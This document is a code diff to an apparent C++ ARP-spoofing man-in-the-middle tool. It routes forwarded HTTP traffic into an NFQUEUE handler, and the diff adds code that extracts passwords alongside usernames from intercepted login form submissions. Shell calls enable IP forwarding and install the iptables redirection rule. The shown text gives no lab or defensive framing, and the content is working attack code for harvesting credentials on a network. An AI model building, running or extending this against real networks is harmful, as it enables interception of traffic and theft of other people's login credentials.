@@ -333,7 +333,7 @@ void keep_sending_arp_reply( unsigned char *source_mac_char, unsigned char *gate
 
 static int nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data)
 {
-    cout << "Packet received" << endl;
+    // cout << "Packet received" << endl;
     char *packet;
     int id = 0;
     struct nfqnl_msg_packet_hdr *ph;
@@ -350,17 +350,19 @@ static int nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, s
         if (ip_header->protocol == IPPROTO_TCP && ntohs(tcp_header->dest) == 80)
         {
             // HTTP packet
-            cout << "HTTP packet" << endl;
-            cout << "Source IP: " << inet_ntoa(*(struct in_addr *)&ip_header->saddr) << endl;
-            cout << "Destination IP: " << inet_ntoa(*(struct in_addr *)&ip_header->daddr) << endl;
-            cout << "Source Port: " << ntohs(tcp_header->source) << endl;
-            cout << "Destination Port: " << ntohs(tcp_header->dest) << endl;
-            cout << "Payload: " << endl;
-            cout << packet + ip_header->ihl * 4 + tcp_header->doff * 4 << endl;
+            // cout << "HTTP packet" << endl;
+            // cout << "Source IP: " << inet_ntoa(*(struct in_addr *)&ip_header->saddr) << endl;
+            // cout << "Destination IP: " << inet_ntoa(*(struct in_addr *)&ip_header->daddr) << endl;
+            // cout << "Source Port: " << ntohs(tcp_header->source) << endl;
+            // cout << "Destination Port: " << ntohs(tcp_header->dest) << endl;
+            // cout << "Payload: " << endl;
+            // cout << packet + ip_header->ihl * 4 + tcp_header->doff * 4 << endl;
             string payload = packet + ip_header->ihl * 4 + tcp_header->doff * 4;
             if (payload.find("txtUsername") != string::npos)
             {
                 cout << "Username: " << payload.substr(payload.find("txtUsername") + 12, payload.find("&") - payload.find("txtUsername") - 12) << endl;
+                // after & is password txtPassword=
+                cout << "Password: " << payload.substr(payload.find("txtPassword") + 12, payload.find("&", payload.find("txtPassword")) - payload.find("txtPassword") - 12) << endl;
             }
         }
     }
@@ -458,16 +460,8 @@ void arp_spoofing()
 int main()
 {
     system("sysctl -w net.ipv4.ip_forward=1 > /dev/null");
-    system("iptables -F");
-    system("iptables -t nat -F");
-    // 允许所有本地生成的数据包通过
-    // system("iptables -A OUTPUT -j ACCEPT");
-    // 重定向来自本地的 HTTP 请求到 nfqueue
-    // system("iptables -A OUTPUT -p tcp --dport 80 -j NFQUEUE --queue-num 0");
-    // 允许所有本地接收的数据包通过
-    // system("iptables -A INPUT -j ACCEPT");
-    // 重定向来自外部的 HTTP 响应到 nfqueue
-    // system("iptables -A INPUT -p tcp --sport 80 -j NFQUEUE --queue-num 0");
+    // system("iptables -F");
+    // system("iptables -t nat -F");
 
     system("iptables -A FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 0");
     
